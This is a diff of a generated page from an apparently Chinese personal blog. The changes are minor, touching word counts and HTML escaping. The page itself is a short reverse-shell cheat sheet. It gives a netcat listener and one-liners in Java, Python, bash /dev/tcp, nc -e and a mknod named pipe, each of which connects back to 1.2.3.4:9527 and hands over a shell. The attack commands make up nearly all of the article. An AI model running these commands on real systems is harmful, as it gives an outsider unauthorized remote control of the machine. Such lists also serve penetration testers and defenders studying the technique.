@@ -475,7 +475,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    224
+                    218
                 </div>
                 
 
@@ -499,16 +499,16 @@
             <div id="articleContent">
                 <h2 id="被攻击主机先监听端口"><a href="#被攻击主机先监听端口" class="headerlink" title="被攻击主机先监听端口"></a>被攻击主机先监听端口</h2><p>这是大前提，至于怎么做就看 hacker 的能力了，最简单脚本可以用 nc ：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">nc -lvvp 9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="攻击主机连接到服务端口"><a href="#攻击主机连接到服务端口" class="headerlink" title="攻击主机连接到服务端口"></a>攻击主机连接到服务端口</h2><h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><pre class="line-numbers language-java"><code class="language-java">Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;&gt;/dev/tcp/1.2.3.4/9527;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="token punctuation">]</span> as String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="攻击主机连接到服务端口"><a href="#攻击主机连接到服务端口" class="headerlink" title="攻击主机连接到服务端口"></a>攻击主机连接到服务端口</h2><h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><pre class="line-numbers language-java"><code class="language-java">Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;>/dev/tcp/1.2.3.4/9527;cat &lt;&amp;5 | while read line; do \$line 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">]</span> as String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <hr>
 <h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.2.3.4",9527));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <hr>
-<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">&gt;</span><span class="token operator">&amp;</span> /dev/tcp/1.2.3.4/9527 0<span class="token operator">&gt;</span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/1.2.3.4/9527 0<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <hr>
 <h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><pre class="line-numbers language-bash"><code class="language-bash">nc -e /bin/sh 1.2.3.4 9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>或</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mknod</span> /tmp/backpipe p
-/bin/sh 0<span class="token operator">&lt;</span>/tmp/backpipe <span class="token operator">|</span> nc 1.2.3.4 9527 1<span class="token operator">&gt;</span>/tmp/backpipe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+/bin/sh 0<span class="token operator">&lt;</span>/tmp/backpipe <span class="token operator">|</span> nc 1.2.3.4 9527 1<span class="token operator">></span>/tmp/backpipe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -1116,7 +1116,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">219.3k</span>&nbsp;字
+                class="white-color">216.4k</span>&nbsp;字
             
             
             
